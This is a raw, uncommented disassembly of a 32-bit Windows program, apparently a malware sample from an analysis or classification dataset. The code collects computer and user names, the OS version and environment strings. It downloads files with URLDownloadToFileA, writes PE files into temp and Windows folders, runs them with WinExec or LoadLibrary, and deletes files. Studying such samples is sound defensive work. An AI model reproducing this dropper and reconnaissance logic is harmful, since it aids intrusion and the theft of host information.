mov [ edi - 0x3c94 ] ebx
call eax
push rw-data
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
push rw-data
push rw-data
call sub_401580
add esp 0x4
push eax
push esi
call sub_4065a0
add esp 0xc
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x4 ] ebx
call [ GetLocalTime@IAT ]
push rw-data
call sub_401580
movzx edx [ ebp - 0x1c ]
movzx ecx [ ebp - 0x1e ]
add esp 0x4
push edx
movzx edx [ ebp - 0x20 ]
push ecx
movzx ecx [ ebp - 0x22 ]
push edx
movzx edx [ ebp - 0x26 ]
push ecx
movzx ecx [ ebp - 0x28 ]
push edx
push ecx
push eax
push esi
call sub_4065a0
add esp 0x20
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x94 ]
push ecx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x18 ] 0xc8
call [ GetComputerNameA@IAT ]
push rw-data
call sub_401580
add esp 0x4
lea edx [ ebp + 0x94 ]
push edx
push eax
lea eax [ edi - 0x3cfc ]
push eax
call sub_4065a0
add esp 0xc
jmp sub_407d9e
sub_407d30
mov edi [ ebp - 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x94 ]
push ecx
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x18 ] 0xc8
call [ GetComputerNameA@IAT ]
push rw-data
call sub_401580
add esp 0x4
lea edx [ ebp + 0x94 ]
push edx
push eax
lea eax [ edi - 0x3cfc ]
push eax
call sub_4065a0
add esp 0xc
jmp sub_407d9e
sub_407dd8
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp + 0x94 ]
push ecx
mov [ ebp - 0x4 ] 0x6
mov [ ebp - 0x18 ] 0xc8
call [ GetUserNameA@IAT ]
push rw-data
call sub_401580
add esp 0x4
lea edx [ ebp + 0x94 ]
push edx
push eax
lea eax [ edi - 0x3cfc ]
push eax
call sub_4065a0
add esp 0xc
mov [ ebp - 0x4 ] 0xffffffff
jmp sub_407e4a
sub_407e4a
cmp [ edi - 0x3c94 ] 0x0
lea esi [ edi - 0x3cfc ]
je r-xdata
push rw-data
push rw-data
jmp r-xdata
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0xa
call sub_406b70
jmp sub_407f2f
call sub_401580
push eax
push esi
call sub_4065a0
add esp 0xc
lea edx [ ebp ]
push edx
mov [ ebp - 0x4 ] 0x8
mov [ ebp ] 0x94
call [ GetVersionExA@IAT ]
push rw-data
call sub_401580
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add esp 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push edx
mov edx [ ebp + 0x4 ]
push ecx
push edx
push eax
push esi
call sub_4065a0
add esp 0x18
push rw-data
call sub_401580
add esp 0x4
lea ecx [ ebp + 0x14 ]
push ecx
push eax
push esi
call sub_4065a0
add esp 0xc
jmp r-xdata
sub_407f69
push 0xc8
lea edx [ ebp + 0x94 ]
push edx
mov [ ebp - 0x4 ] 0xe
call [ GetSystemDirectoryA@IAT ]
push rw-data
call sub_401580
add esp 0x4
lea ecx [ ebp + 0x94 ]
push ecx
push eax
lea edx [ edi - 0x3cfc ]
push edx
call sub_4065a0
add esp 0xc
jmp sub_407fcd
sub_407fcd
push rw-data
mov [ ebp - 0x4 ] 0x10
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
mov [ ebp - 0x4 ] 0x12
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
push rw-data
mov [ ebp - 0x4 ] 0x14
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
push rw-data
mov [ ebp - 0x4 ] 0x16
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x18
call sub_407bb0
jmp sub_4081c6
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
sub_40803a
mov edi [ ebp - 0x14 ]
push rw-data
mov [ ebp - 0x4 ] 0x12
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
mov [ ebp - 0x4 ] 0x14
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
push rw-data
mov [ ebp - 0x4 ] 0x16
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x18
call sub_407bb0
jmp sub_4081c6
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
sub_4080aa
mov edi [ ebp - 0x14 ]
push rw-data
mov [ ebp - 0x4 ] 0x14
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
mov [ ebp - 0x4 ] 0x16
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x18
call sub_407bb0
jmp sub_4081c6
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
sub_408119
mov edi [ ebp - 0x14 ]
push rw-data
mov [ ebp - 0x4 ] 0x16
call sub_401580
add esp 0x4
lea esi [ edi - 0x3cfc ]
push eax
mov ecx esi
call sub_4063e0
mov ebx eax
test ebx ebx
je r-xdata
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x18
call sub_407bb0
jmp sub_4081c6
push rw-data
call sub_401580
add esp 0x4
push ebx
push eax
push esi
call sub_4065a0
add esp 0xc
push ebx
mov ecx esi
call sub_4072c0
jmp r-xdata
sub_4081c6
push rw-data
mov [ ebp - 0x4 ] 0x1a
call sub_401580
add esp 0x4
push eax
lea ebx [ edi - 0x3cfc ]
push ebx
call sub_4065a0
add esp 0x8
call [ GetEnvironmentStrings@IAT ]
mov esi eax
lea ecx [ edi - 0x3cfc ]
mov [ ebp - 0x4 ] 0x1c
call sub_4078c0
jmp sub_408285
push rw-data
call sub_401580
add esp 0x4
push esi
push eax
push ebx
call sub_4065a0
add esp 0xc
push esi
call sub_405930
add esp 0x4
lea esi [ esi + eax + 0x1 ]
jmp r-xdata
push esi
call sub_405930
add esp 0x4
test eax eax
je r-xdata
sub_4083d2
mov edx [ edi - 0x3cfc ]
mov eax [ edx + 0x8 ]
lea ecx [ edi - 0x3cfc ]
call eax
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x15c ]
xor ecx ebp
call sub_40acd2
add ebp 0x160
mov esp ebp
pop ebp
retn 0x4
sub_408450
mov eax ecx
mov edx [ eax + 0x4 ]
mov [ eax ] rw-data
mov edx [ edx + 0x4 ]
mov [ edx + eax + 0x4 ] rw-data
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x8 ]
lea ecx [ eax + 0x4 ]
mov [ edx + eax + 0x4 ] rw-data
mov edx [ ecx ]
mov edx [ edx + 0x10 ]
mov [ edx + eax + 0x4 ] rw-data
mov edx [ ecx ]
mov [ eax ] rw-data
mov edx [ edx + 0x4 ]
mov [ edx + eax + 0x4 ] rw-data
mov edx [ ecx ]
mov edx [ edx + 0x8 ]
mov [ edx + eax + 0x4 ] rw-data
jmp sub_409330
sub_4084c0
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
lea edx [ eax - 0x140 ]
mov [ eax + ecx - 0x4 ] edx
jmp sub_409330
sub_408500
sub esp 0x944
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x940 ] eax
push esi
mov esi [ esp + 0x94c ]
push edi
mov edi [ esp + 0x954 ]
push 0x0
lea eax [ esp + 0x14c ]
push esi
push eax
call sub_4059c0
lea ecx [ esp + 0x154 ]
push edi
push ecx
call sub_405980
add esp 0x14
lea edx [ esp + 0x8 ]
push edx
lea eax [ esp + 0x14c ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ esp + 0x948 ]
pop edi
pop esi
xor ecx esp
call sub_40acd2
add esp 0x944
retn 0x8
push ebx
mov ebx [ FindNextFileA@IAT ]
push ebp
mov ebp [ DeleteFileA@IAT ]
lea ecx [ ecx ]
lea edx [ esp + 0x10 ]
push edx
push edi
call ebx
test eax eax
jne r-xdata
push 0x0
lea ecx [ esp + 0x554 ]
push esi
push ecx
call sub_4059c0
lea edx [ esp + 0x48 ]
push edx
lea eax [ esp + 0x560 ]
push eax
call sub_405980
add esp 0x14
lea ecx [ esp + 0x550 ]
push ecx
call ebp
test [ esp + 0x10 ] 0x10
jne r-xdata
push edi
call [ FindClose@IAT ]
pop ebp
pop ebx
sub_4085e0
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0x5a4d
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax + 0x4 ] 0x14c
jne r-xdata
xor eax eax
retn 0x8
cmp [ eax ] 0x4550
jne r-xdata
mov ax [ eax + 0x16 ]
and ax 0x2000
neg ax
sbb eax eax
add eax 0x2
retn 0x8
sub_408620
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x129 ]
jmp r-xdata
xor ecx ecx
jmp sub_408450
add ecx 0x15
jmp sub_408450
test ecx ecx
mov edx [ eax + 0x4 ]
mov [ eax ] rw-data
mov edx [ edx + 0x4 ]
mov [ edx + eax + 0x4 ] rw-data
mov edx [ eax + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ edx + eax + 0x4 ] rw-data
je r-xdata
sub_408670
push 0xffffffff
push sub_4150c8
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x8 ] esi
test esi esi
mov [ esp + 0x14 ] 0x0
je r-xdata
xor ecx ecx
lea ecx [ esi + 0x43e2 ]
jmp r-xdata
xor eax eax
lea eax [ esi + 0x129 ]
jmp r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
mov [ ecx + edx ] rw-data
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
lea edx [ eax - 0x140 ]
mov [ eax + ecx - 0x4 ] edx
call sub_409330
test esi esi
mov [ esp + 0x14 ] 0xffffffff
je r-xdata
xor ecx ecx
lea ecx [ esi + 0x15 ]
jmp r-xdata
test esi esi
mov ecx [ eax + 0x4 ]
mov [ eax ] rw-data
mov edx [ ecx + 0x4 ]
mov [ edx + eax + 0x4 ] rw-data
mov ecx [ eax + 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ edx + eax + 0x4 ] rw-data
je r-xdata
call sub_408450
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
add esp 0x10
retn
sub_408770
mov eax 0x1554
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1550 ] eax
mov edx [ esp + 0x155c ]
cmp edx 0x20
mov eax [ esp + 0x1558 ]
jae r-xdata
push ebx
push edi
add eax 0x10
lea edi [ ecx - 0x129 ]
add edx 0xfffffff0
push edx
push eax
mov ecx edi
mov [ esp + 0x1c ] eax
mov [ esp + 0x10 ] edi
call sub_4085e0
mov ebx eax
test ebx ebx
jne r-xdata
xor al al
mov ecx [ esp + 0x1550 ]
xor ecx esp
call sub_40acd2
add esp 0x1554
retn 0x8
push ebp
push esi
mov esi [ GetTempPathA@IAT ]
lea eax [ esp + 0x560 ]
push eax
push 0x400
call esi
push rw-data
lea ecx [ esp + 0x564 ]
push ecx
mov ecx edi
call sub_408500
lea edx [ esp + 0x560 ]
push edx
push 0x400
call esi
push 0x400
lea eax [ esp + 0xd64 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
push 0x0
lea ecx [ esp + 0xd64 ]
push ecx
lea edx [ esp + 0x968 ]
push edx
call sub_4059c0
add esp 0xc
cmp ebx 0x2
jne r-xdata
xor al al
jmp r-xdata
cmp ebx 0x1
jne r-xdata
push rw-data
call sub_401580
push eax
lea eax [ esp + 0x968 ]
push eax
jmp r-xdata
mov ecx [ esp + 0x1558 ]
pop edi
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x1554
retn 0x8
lea edx [ esp + 0x20 ]
push edx
lea eax [ esp + 0x964 ]
push eax
mov [ esp + 0x20 ] 0x0
call [ FindFirstFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
push rw-data
call sub_401580
push eax
lea ecx [ esp + 0x968 ]
push ecx
call sub_405980
add esp 0xc
xor ebp ebp
jmp r-xdata
test [ esp + 0x20 ] 0x10
jne r-xdata
lea edx [ esp + 0x1160 ]
push 0x6
push edx
call sub_4025c0
push 0x0
lea eax [ esp + 0x56c ]
push eax
lea ecx [ esp + 0x170 ]
push ecx
call sub_4059c0
lea edx [ esp + 0x1174 ]
push edx
lea eax [ esp + 0x178 ]
push eax
call sub_405980
add esp 0x1c
cmp ebx 0x1
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
push ebp
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
push 0x0
lea ecx [ esp + 0x564 ]
push ecx
lea edx [ esp + 0x168 ]
push edx
call sub_4059c0
lea eax [ esp + 0x58 ]
push eax
lea ecx [ esp + 0x170 ]
push ecx
call sub_405980
add esp 0x14
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea edx [ esp + 0x178 ]
push edx
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
cmp ebx 0x2
jne r-xdata
push rw-data
call sub_401580
push eax
lea ecx [ esp + 0x168 ]
push ecx
jmp r-xdata
jmp r-xdata
mov edi [ esp + 0x156c ]
mov edx [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
add edi 0xfffffff0
push edi
push edx
push esi
call [ WriteFile@IAT ]
cmp edi [ esp + 0x14 ]
jne r-xdata
push 0x0
push 0x80
push 0x1
push 0x0
push 0x1
push 0x40000000
lea eax [ esp + 0x178 ]
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push rw-data
call sub_401580
push eax
lea edx [ esp + 0x168 ]
push edx
call sub_405980
add esp 0xc
push ebp
call [ FindClose@IAT ]
cmp [ esp + 0x18 ] 0x0
jne r-xdata
mov edi [ esp + 0x10 ]
push esi
call [ CloseHandle@IAT ]
cmp ebx 0x2
jne r-xdata
mov edi [ esp + 0x156c ]
mov edx [ esp + 0x1c ]
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
add edi 0xfffffff0
push edi
push edx
push esi
call [ WriteFile@IAT ]
cmp edi [ esp + 0x14 ]
jne r-xdata
add ebp 0x1
cmp ebp 0x80
jl r-xdata
pop esi
mov al 0x1
pop ebp
cmp ebx 0x1
jne r-xdata
push 0x0
lea eax [ esp + 0x164 ]
push eax
call [ WinExec@IAT ]
jmp r-xdata
cmp ebp 0x80
jl r-xdata
push esi
call [ CloseHandle@IAT ]
cmp ebx 0x1
jne r-xdata
jmp r-xdata
mov [ esp + 0x18 ] 0x1
lea ecx [ esp + 0x160 ]
push ecx
call [ LoadLibraryA@IAT ]
mov edi [ esp + 0x10 ]
cmp ebx 0x2
jne r-xdata
lea eax [ esp + 0x160 ]
push eax
call [ LoadLibraryA@IAT ]
jmp r-xdata
lea edx [ esp + 0x560 ]
push edx
push 0x400
call [ GetTempPathA@IAT ]
push rw-data
lea eax [ esp + 0x564 ]
push eax
mov ecx edi
call sub_408500
push rw-data
lea ecx [ esp + 0x564 ]
push ecx
mov ecx edi
call sub_408500
push 0x0
lea ecx [ esp + 0x164 ]
push ecx
call [ WinExec@IAT ]
sub_408b20
push 0xffffffff
push sub_415147
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x1c ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x18 ] esi
xor ebx ebx
mov [ esp + 0x14 ] ebx
cmp [ esp + 0x2c ] ebx
mov ebp 0x3
je r-xdata
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov [ esi + ecx + 0x4 ] rw-data
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
mov [ esi + eax + 0x4 ] rw-data
mov ecx [ esi + 0x4 ]
mov [ esi ] rw-data
mov edx [ ecx + 0x4 ]
mov [ edx + esi + 0x4 ] rw-data
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x8 ]
lea edi [ esi + 0x15 ]
mov [ ecx + esi + 0x4 ] rw-data
push ebx
mov ecx edi
mov [ esp + 0x30 ] edi
call sub_40abe0
mov edx [ edi + 0x4 ]
mov [ edi ] rw-data
mov eax [ edx + 0x4 ]
mov [ eax + edi + 0x4 ] rw-data
mov ecx [ edi + 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ edx + edi + 0x4 ] rw-data
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ecx + edi + 0x4 ] rw-data
mov [ esp + 0x24 ] ebp
lea ebp [ esi + 0x129 ]
push ebx
mov ecx ebp
call sub_40a180
lea ebx [ esi + 0x23e ]
mov ecx ebx
mov [ esp + 0x24 ] 0x4
call sub_402b70
mov [ ebx ] rw-data
mov edx [ esi + 0x4 ]
mov [ esi ] rw-data
mov [ edi ] rw-data
mov [ ebp ] rw-data
mov [ ebx ] rw-data
mov eax [ edx + 0x4 ]
mov [ eax + esi + 0x4 ] rw-data
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x8 ]
mov [ edx + esi + 0x4 ] rw-data
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x10 ]
mov [ ecx + esi + 0x4 ] rw-data
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x14 ]
mov [ eax + esi + 0x4 ] rw-data
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov [ edx + esi + 0x4 ] rw-data
mov eax esi
mov ecx [ esp + 0x1c ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn 0x4
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x19 ] rw-data
mov [ esi + 0x12d ] rw-data
mov [ esi + 0x6e6 ] rw-data
lea ecx [ esi + 0x7f2 ]
mov [ esi + 0x7ee ] rw-data
call sub_4090a0
lea edi [ esi + 0x812 ]
mov ecx edi
mov [ esp + 0x24 ] ebx
mov [ esp + 0x14 ] 0x1
call sub_402b70
mov [ edi ] rw-data
mov [ esi + 0x846 ] rw-data
mov [ esi + 0x84a ] rw-data
mov [ esi + 0x84e ] bl
mov [ esp + 0x24 ] 0x1
mov [ esp + 0x14 ] ebp
sub_408d00
push 0xffffffff
push sub_4151c4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x14 ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ esp + 0x10 ] esi
cmp [ esp + 0x24 ] 0x0
mov [ esp + 0xc ] 0x0
je r-xdata
push 0x0
mov ecx esi
call sub_408b20
push 0x0
lea ecx [ esi + 0x43e2 ]
mov [ esp + 0x20 ] 0x2
call sub_40a2a0
lea edi [ esi + 0x6e6 ]
mov ecx edi
mov [ esp + 0x1c ] 0x3
call sub_402b70
mov eax [ edi + 0x64 ]
mov [ edi ] rw-data
mov ecx [ eax + 0x4 ]
mov [ ecx + edi + 0x64 ] rw-data
mov edx [ esi + 0x43f2 ]
mov eax [ edx + 0x4 ]
mov [ esi + eax + 0x43f2 ] rw-data
mov ecx [ esi + 0x45fc ]
mov edx [ ecx + 0x4 ]
mov [ esi + edx + 0x45fc ] rw-data
mov eax [ esi + 0x4 ]
mov [ esi ] rw-data
mov [ esi + 0x15 ] rw-data
mov [ esi + 0x129 ] rw-data
mov [ esi + 0x23e ] rw-data
mov [ edi ] rw-data
mov ecx [ eax + 0x4 ]
mov [ ecx + esi + 0x4 ] rw-data
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x8 ]
mov [ eax + esi + 0x4 ] rw-data
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x10 ]
mov [ edx + esi + 0x4 ] rw-data
mov eax [ esi + 0x4 ]
mov ecx [ eax + 0x14 ]
mov [ ecx + esi + 0x4 ] rw-data
mov edx [ esi + 0x4 ]
mov eax [ edx + 0x18 ]
mov [ eax + esi + 0x4 ] rw-data
mov ecx [ esi + 0x4 ]
mov edx [ ecx + 0x18 ]
mov [ esi + edx ] 0x0
mov eax esi
mov ecx [ esp + 0x14 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
add esp 0x14
retn 0x4
mov [ esi + 0x4 ] rw-data
mov [ esi + 0x19 ] rw-data
mov [ esi + 0x12d ] rw-data
mov [ esi + 0x43e2 ] rw-data
mov [ esi + 0x74a ] rw-data
mov [ esi + 0x43f2 ] rw-data
mov [ esi + 0x45fc ] rw-data
mov [ esi + 0x4600 ] rw-data
lea ecx [ esi + 0x470c ]
mov [ esi + 0x4708 ] rw-data
call sub_4090a0
lea edi [ esi + 0x472c ]
mov ecx edi
mov [ esp + 0x1c ] 0x0
mov [ esp + 0xc ] 0x1
call sub_402b70
mov [ edi ] rw-data
mov [ esi + 0x4760 ] rw-data
mov [ esi + 0x4768 ] rw-data
mov [ esi + 0x476c ] 0x0
mov [ esp + 0x1c ] 0x1
mov [ esp + 0xc ] 0x3
_start
push 0xffffffff
push sub_4151eb
mov eax [ fs : 0x0 ]
push eax
mov eax 0x4870
call sub_40ad70
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x486c ] eax
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4874 ]
mov [ fs : 0x0 ] eax
call sub_401000
test al al
je r-xdata
push rw-data
call sub_402ce0
add esp 0x4
push 0x1
lea ecx [ esp + 0x8 ]
mov [ rw-data ] 0x0
call sub_408d00
push 0x0
lea ecx [ esp + 0x8 ]
mov [ esp + 0x4880 ] 0x0
call sub_40a870
push 0x0
call [ ExitProcess@IAT ]
xor eax eax
mov ecx [ esp + 0x4874 ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ esp + 0x486c ]
xor ecx esp
call sub_40acd2
add esp 0x487c
retn
sub_409030
push esi
push 0x0
push 0x0
push 0x1
push 0x0
call [ CreateEventA@IAT ]
mov esi eax
mov eax [ esp + 0x8 ]
push eax
push esi
call [ WaitForSingleObject@IAT ]
push esi
call [ CloseHandle@IAT ]
pop esi
retn 0x4
sub_409060
mov eax [ esp + 0x8 ]
test eax eax
push esi
mov esi ecx
je r-xdata
mov eax [ esp + 0x8 ]
test eax eax
je r-xdata
push 0x8
push eax
lea eax [ esi + 0x10 ]
push eax
call sub_405d50
add esp 0xc
mov al 0x1
pop esi
retn 0x8
push 0x8
push eax
push esi
call sub_405d50
add esp 0xc
sub_4090a0
push esi
mov esi ecx
lea eax [ esi + 0x10 ]
push 0x10
push eax
call sub_4022d0
push 0x10
push esi
call sub_4022d0
add esp 0x10
mov eax esi
pop esi
retn
sub_4090e0
sub esp 0x80c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x808 ] eax
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x0
lea eax [ ebp + 0x15 ]
push eax
lea ecx [ esp + 0x420 ]
push ecx
call sub_4059c0
lea edx [ esp + 0x424 ]
push rw-data
push edx
call sub_405980
mov eax [ ebp + 0x4 ]
mov ecx [ eax + 0xc ]
lea edx [ ecx + ebp + 0x4 ]
push edx
lea eax [ esp + 0x430 ]
push eax
call sub_405980
mov ecx [ ebp + 0x4 ]
mov edx [ ecx + 0xc ]
lea eax [ edx + ebp + 0x14 ]
push eax
lea ecx [ esp + 0x438 ]
push ecx
call sub_405980
mov edx [ ebp ]
mov edx [ edx ]
add esp 0x24
lea eax [ esp + 0x418 ]
push eax
mov ecx ebp
call edx
lea eax [ esp + 0x18 ]
push eax
push 0x400
call [ GetTempPathA@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
push 0x5
push rw-data
mov edx ecx
push edx
call [ GetTempFileNameA@IAT ]
xor esi esi
mov [ esp + 0x14 ] esi
mov edi edi
cmp esi 0x3
jge r-xdata
push eax
push eax
push 0x3
push eax
push 0x1
push 0x80000000
lea edx [ esp + 0x30 ]
push edx
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
xor al al
mov ecx [ ebp + 0x4 ]
mov edx [ ecx + 0xc ]
push 0x1388
lea ecx [ edx + ebp + 0x4 ]
call sub_409030
mov esi [ esp + 0x14 ]
add esi 0x1
cmp esi 0x3
mov [ esp + 0x14 ] esi
jl r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov ebx eax
test ebx ebx
jbe r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x20 ]
push eax
lea ecx [ esp + 0x424 ]
push ecx
push 0x0
call URLDownloadToFileA
test eax eax
jne r-xdata
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
lea eax [ esp + 0x18 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_402260
mov edi eax
add esp 0x4
test edi edi
je r-xdata
push esi
call [ CloseHandle@IAT ]
lea ecx [ esp + 0x18 ]
push ecx
call [ DeleteFileA@IAT ]
jmp r-xdata
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push ebx
push edi
push esi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
push edi
call sub_402280
add esp 0x4
push esi
call [ CloseHandle@IAT ]
lea eax [ esp + 0x18 ]
push eax
call [ DeleteFileA@IAT ]
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
lea edx [ esp + 0x18 ]
push edx
call [ DeleteFileA@IAT ]
mov eax [ esp + 0x10 ]
test eax eax
jbe r-xdata
push eax
push edi
lea ecx [ ebp + 0x4 ]
call sub_401710
test eax eax
je r-xdata
push edi
call sub_402280
add esp 0x4
mov [ edi + ebx ] 0x0
mov ecx [ esp + 0x10 ]
mov edx [ ebp ]
mov edx [ edx + 0x4 ]
sub ecx eax
add ecx edi
push ecx
push eax
mov ecx ebp
call edx
push edi
movzx esi al
call sub_402280
add esp 0x4
test esi esi
setne al
jmp r-xdata
mov ecx [ esp + 0x818 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40acd2
add esp 0x80c
retn
sub_409350
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x4c ]
cmp eax 0x40
push esi
push edi
mov ecx 0x10
mov esi rw-data
lea edi [ esp + 0x8 ]
[ edi ] [ esi ]
movsb [ edi ] [ esi ]
pop edi
pop esi
jae r-xdata
mov ecx [ esp + 0x44 ]
xor ecx esp
mov al 0x3d
call sub_40acd2
add esp 0x48
retn 0x4
mov al [ esp + eax ]
mov ecx [ esp + 0x44 ]
xor ecx esp
call sub_40acd2
add esp 0x48
retn 0x4
sub_4093b0
push ecx
push ebp
xor edx edx
xor ebp ebp
cmp [ esp + 0x10 ] edx
mov [ esp + 0x4 ] ecx
jle r-xdata
mov eax [ esp + 0x14 ]
